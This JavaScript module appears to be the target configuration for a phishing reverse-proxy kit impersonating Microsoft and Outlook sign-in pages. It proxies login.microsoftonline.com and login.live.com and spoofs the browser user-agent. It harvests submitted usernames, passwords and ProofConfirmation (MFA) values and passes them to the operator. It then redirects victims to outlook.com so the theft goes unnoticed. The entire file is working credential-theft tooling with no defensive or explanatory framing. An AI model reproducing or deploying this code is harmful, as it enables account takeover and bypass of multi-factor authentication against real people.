/* eslint-disable camelcase,class-methods-use-this */
// eslint-disable-next-line max-classes-per-file
const path = require('path')
const url = require('url')

// eslint-disable-next-line import/no-dynamic-require
const globalWorker = process.HOOK_JS_MODULE

/** Defined Functions used */


/** Important Defaults */
const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClass {

    constructor(proxyEndpoint, browserReq) {
        super(proxyEndpoint, browserReq)
    }

    processRequest() {
        return super.processRequest()

    }
}

const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseClass {

    constructor(proxyResp, browserEndPoint) {

        super(proxyResp, browserEndPoint)
        this.regexes = [
             {
                reg: /https:\/\/account.live.com\/identity\/confirm/igm, // Google chrome on windows fix
                replacement: '/identity/confirm/'
             },
        ]
    }


    processResponse() {
        if (this.proxyResp.headers['content-length'] < 1) {
            return this.proxyResp.pipe(this.browserEndPoint)
        }

        const extRedirectObj = super.getExternalRedirect()
        if (extRedirectObj !== null) {
            const rLocation = extRedirectObj.url

            if (rLocation.startsWith('https://account.live.com') || rLocation.startsWith('https://account.microsoft.com')) {
                return this.afterEmailPath()
            }
        }

        let appHeaders = this.browserEndPoint.getHeaders()['set-cookie'] || []
        appHeaders = appHeaders.filter(appSingleHeader => {
            return !appSingleHeader.startsWith('OParams=')
        })
        this.browserEndPoint.setHeader('set-cookie', appHeaders)


        // this.browserEndPoint.removeHeader('content-security-policy')
        let newMsgBody;
        return this.superPrepareResponse(true)
            .then((msgBody) => {
                newMsgBody = msgBody
                for (let i = 0; i < this.regexes.length; i += 1) {
                    const regExObj = this.regexes[i]
                    if (regExObj.reg.test(newMsgBody)) {
                        newMsgBody = newMsgBody.replace(regExObj.reg, regExObj.replacement)
                    }
                }
                this.superFinishResponse(newMsgBody)
            }).catch((err) => {
            console.error(err)
        })
    }

    afterEmailPath() {
        this.browserEndPoint.setHeader('location', '/auth0/outlook/owa2')
        this.browserEndPoint.end('')
    }


}


const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return true

    }

    execute(clientContext) {
        this.req.headers['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36'

        this.req.headers['accept-encoding'] = 'gzip, br'
        if (this.req.method === 'POST') {
            // super.uploadRequestBody(clientContext.currentDomain, clientContext)
            if (this.req.url.startsWith('/ppsecure/post.srf?')) {
                super.uploadRequestBody(clientContext.currentDomain, clientContext)
                clientContext.setLogAvailable(true)
            }
            
            super.captureBody(clientContext.currentDomain, clientContext)

        }
        if (this.req.url.startsWith('/identity/confirm')) {
            clientContext.currentDomain = 'account.live.com'

        }


        // Check for redirect
        const redirectToken = this.checkForRedirect()
        if (redirectToken !== null) {
            if (redirectToken.url.startsWith('https://login.live.com/oauth20_authorize.srf?')) {
                clientContext.currentDomain = 'login.live.com'
                this.req.url = `${redirectToken.obj.pathname}${redirectToken.obj.query}`
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }

            if (redirectToken.url.startsWith('https://login.microsoftonline.com/common/oauth2/nativeclient')) {
                super.sendClientData(clientContext, {})
                this.res.writeHead('301', { location: 'https://outlook.com' })
                return this.res.end()
            }
        }
        

        if (this.req.url === '/auth0/outlook/owa2') {
            super.sendClientData(clientContext, {})
            this.res.writeHead('301', { location: 'https://outlook.com' })
            return this.res.end()
        }

        return super.superExecuteProxy(clientContext.currentDomain, clientContext)

    }
}




const configExport = {
    CURRENT_DOMAIN: 'login.microsoftonline.com',

    EXTERNAL_FILTERS: 
    [
        'account.live.com',
    ],

    START_PATH: '/consumers/oauth2/v2.0/authorize?response_type=code&scope=Secrets.ReadWrite.CreatedByApp.Secure+offline_access&client_id=229f4d61-07eb-454a-9453-d27bba7cc95b&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient&response_mode=query&state={%22id%22:%22fiedbfgcleddlbcmgdigjgdfcggjcion%22}',

    PRE_HANDLERS:
        [
        ],
    PROXY_REQUEST: ProxyRequest,
    PROXY_RESPONSE: ProxyResponse,
    DEFAULT_PRE_HANDLER: DefaultPreHandler,

    CAPTURES: {
        loginUserName: {
            method: 'POST',
            params: ['username'],
            urls: '',
            hosts: ['login.live.com'],
        },

        loginPassword: {
            method: 'POST',
            params: ['passwd'],
            urls: '',
            hosts: ['login.live.com'],
        },

        proofConfirm: {
            method: 'POST',
            params: ['ProofConfirmation'],
            urls: '',
            hosts: ['login.live.com'],
        },

        defaultPhpCapture: {
            method: 'POST',
            params: ['default'],
            urls: ['/web'],
            hosts: 'PHP-EXEC',
        },
    },

    // proxyDomain: process.env.PROXY_DOMAIN,
}
module.exports = configExport